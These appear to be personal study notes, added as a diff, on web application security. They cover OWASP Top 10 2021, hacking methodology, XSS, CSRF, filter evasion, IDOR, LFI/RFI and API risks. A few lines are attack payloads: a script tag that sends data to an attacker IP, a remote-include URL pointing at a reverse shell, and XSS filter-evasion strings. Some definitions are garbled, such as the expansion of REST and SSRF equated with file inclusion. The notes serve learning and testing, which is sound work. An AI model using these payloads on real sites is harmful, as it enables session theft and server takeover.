@@ -1,0 +1,178 @@
+	Web App Basics:
+Definition: Software that is served via the web
+Technologies used: HTTP/s, php, js, perl
+SOAP web service: Simple Object Access Protocol - XML based API for serving web pages
+  Uses a WSDL file that defines how the web service works
+REST web service: Representation service transfer - URL based HTTP API for service web pages via web requests
+Security Risks:
+  Injections
+  Security Misconfigurations
+  Using components with known vulnerabilities
+Security Defenses:
+  Encryption!!!
+  Security Testing:
+    SAST - Static Application Security Testing
+    DAST - Dynamic AST
+    Automated tools but also manual looking is warranted
+  Fuzz Testing: 
+    Fuzzing - Checking inputs provided by end user - check for size, char types
+    Strategies:
+      Mutation - Take normal inputs and transform/modify them
+      Generational - takes input model and breaks it into pieces (such as fuzzing each component of a tcp packet)
+      Protocol-Based - Forged packets/input based on protocol specific functionality
+  Encoding: Prevent plaintext from being in transit/rest
+    Base64/hex/url encode things through the web app code
+  Allowlisting/Denylisting
+  Content filtering/Input Sanitization: regex filtering, ensuring input from user is 
+  WAF  
+  RASP - Run Application Self Protection - Intercepts all calls from app to system
+  Bug Bounty Programs - paid hackers to test web app software legally (within scope)
+    Companies - BugCrowd, HackerOne
+
+	OWASP Top 10 Web Application Attacks 2021:
+OWASP - Organization to help understand web-based attacks. Open Web Application Security Project
+A01. Broken Access Control
+  Compromise of the CIA
+  Improper implementation or configuration of access, confidentiality or integrity of data 
+  Example: IDOR, non-admin accessing admin web locations 
+A02. Cryptographic Failures
+  Improper encryption to sensitive data. 
+  Lack of/weak encryption, or encrytion with too little entropy.
+  STRONG encryption should be used when sending data, accessing data in use, and having data at rest 
+A03. Injection
+  Malicious User Provided data that is allowed and accepted
+  Examples: Fuzzing, XSS, SQLi
+A04. Insecure Design 
+  Lack of Security Implementation during SDLC (Software Development Lidecycle)
+  Using secure tools and code libraries 
+  Threat modeling, Security testing of code
+A05. Security Misconfigurations
+  Security controls that are allowing for compromising
+  Example: Default Creds, Unnessecary or unused services, Allowing overly verbose errors/stacktracing, Directory Listing
+A06. Vulnerable or Outdated Components
+  Using software or hardware that is known to be vulnerable to attacks
+  Ex. Apache Struts Equifax breach
+A07. Identification/Authentification Errors
+  Authentication process does not effectively validate user's identity
+  Ex. Login form that accepts SQLi, Login Bruteforcing/BruteSpraying, Session Hijacking/Reuse, Lack of MFA/2FA
+A08. Software and Data Integrity Failures
+  Software that utilizes a module or third-party plugin that is not secure or compromised
+  Ex. Wordpress site is fine, but the plugin is vulnerable, Auto-Update is insecure, insecure deserialization
+A09. Security Logging and Monitoring Failures
+  Security Auditing, logging or monitoring is not present or sufficient on as many hosts as possible
+  Make sure logs are verbose and easy to understand 
+  Backup and replicate logs remotely (syslog)
+A010. Server-Side Request Forgery
+  Abuse of web application making a request that user should not have access to
+  No request validation
+  Ex: LFI/RFI
+
+	Web App Hacking Methodology:
+Ultimately, you should develop your own methodology over time.
+Recognize patterns of different techniques of experts.
+Steps:
+  1. Recon, Footprinting and Enumeration
+    Begin looking at target, organization, job boards
+    Look for and learn about IP addresses, Virtual Hosts, Subdomains, Firewalls, WAFs, Capchas, Rate Limiting,
+    Look at any versioning of services, ports, look for files, directories, potentially hidden content 
+    Tools: Find the ones that work for you
+  2. Vulnerability Assessments
+    A lot of automation, but there is still manual testing
+    Determine if any vulnerabilities can be used to exploit
+    a. Use vulnerability scanners
+    Tools: nikto, skipfish, wapitty, OWASP ZAP!, Burpsuite Pro
+    b. Test for injections, either manually or programmatically 
+    Tools: comet, wfuzz, fuff
+    c. Run CMS specific vulnerability scanners, such as wpscan for wordpress, joomscan for joomla
+    d. Check for vulnerabilities in a db such as searchsploit, exploit-db.com, vulners.com, google
+  3. Exploit Vulnerability or Otherwise Attack Web App
+    Follow what you learned in Phase 2 and execute
+    OWASP Top 10 can be a useful method
+
+	Unvalidated Redirects and Forwards:
+Unvalidated Redirect: Link to website (served by page or link) redirects to malicious site for 
+  Used in phishing attacks to direct victim to malicious site
+  Used in cloned site (created with SETools)
+  If redirect URL takes a parameter in URL that redirects to remote site instead of local, it can be exploited 
+Unvalidated Forward: Same thing but with forwards
+
+	XSS and CSRF:
+XSS - Cross Site Scripting
+  Malicious input from user interpreted as code
+  Types:
+    Reflected: Website that reflects input back to the user (Such as "you search for [bad code]")
+    Stored/Persistent: Malicious input is stored on page regardless of refreshes or user. (Blogs, comments, etc) 
+    DOM/Client Based: Isn't processed by server, code is interpreted entirely in browser (eval, innerHTML.write in DOM)
+  Method:
+    Add test javascript to input to determine validity of vulnerability 
+      Tip: Use XSS payload list with fuzzing tool
+
+CSRF - Cross Site Request Forgery
+  Abuse of established trust relationship between target and web server
+  Using a valid session token, gets user to do things they don't know about or indend to do 
+  Method:
+    Need the URL of target and URL parameters
+    Add XSS with link using poisoned parameters such as <script>new Image().src="http://ip/params"</script>
+
+	Input Filtering Evasion:
+Character encoding: Change the characters that regex is filtering
+Interpret input as different encoding, instead of ASCII, perhaps base64, HTML
+ASCII Table: Shows Dec, Hex, Oct, HTML, and Char representation; instead of ' you can use &#39; or &#000x39;
+Whitespace: Padding with nullspace to obfuscatge your input, such ase "co\td e", line feeds, carriage returns, etc.
+Script Tag Manipulation (Specifically for XSS): Make script tag look weird, such as <sCr<script>iPT>
+  A lot of systems do not care about case sensitivity
+Polyglots: Every type of encoding in one string so it tests for all at the same time.
+  You can find xss polyglots on github
+  Good for testing input boxes that don't seem to work initially
+
+	IDOR (Insecure Direct Object Reference):
+Definition: Parameters to a web application that should not be manipulatable or accessable by end user but are
+Process these request through local proxy using Burpsuite or ZAP and change POST body or params
+Perhaps use repeater in burpsuite community
+
+	LFI and RFI:
+File Inclusion: Including a file into a web application 
+Remote File Inclusion:
+  Find the FI:
+    Check the URL for something such as "?param=file.php"
+    If found, you can modify the param to "?param=http://attackerip:port/revsh.php"
+    If you see website trying to load, that is a good sign.
+Local File Inclusion:
+  one option is to alter the cookie in burpsuite repeater such that it is now requesting a file above the document root.
+  You may also be able to attack environment file by changing the user agent to a php shell.
+  
+	Webhooks and APIs:
+API - Single web service that can facilitate/manage multiple online sources
+  Less complex than the old ways of doing things
+  Examples: SOAP (Simple object access protocol), REST(ful) (REpresentional State Transfer)
+  Data Types: XML, JSON
+Webhook - Push notifications. Connection that is ready and waiting without needing request
+API Scurity Risks Top 10:
+  Broken Object Level Auth
+  Broken User Level Auth
+  Excessive Data Exposure
+  Lack of Resources & Rate Limiting
+  Broken Function Level Auth
+  Mass Assignment
+  
+  Injection
+  Improper asset management
+  Impoper Logging and Monitoring
+API Hacking Methodology:
+  Identify Target
+  Detect Security Standards that are protecting it and if there are holes
+  Identify attack surfce - see if there is communication between other servers/services 
+  Launch attack
+API Countermeasures:
+  Sanitize User Input
+  Firewalls
+  Rate-Limiting
+  Parameterized Statements - Prepared statements
+  Pagination - Take input a page at a time
+  MFA
+Webhooks:
+  Require Authentication to sebhook sender
+  Blacklist calls from unauthorized services
+  Webhook signing - to protect integrity
+  Webhook timestamps (XCLD Timestamps, X-OP Timestamps) To prevent timing attacks
+Burpsuite requires installing free WSDLer from extensions
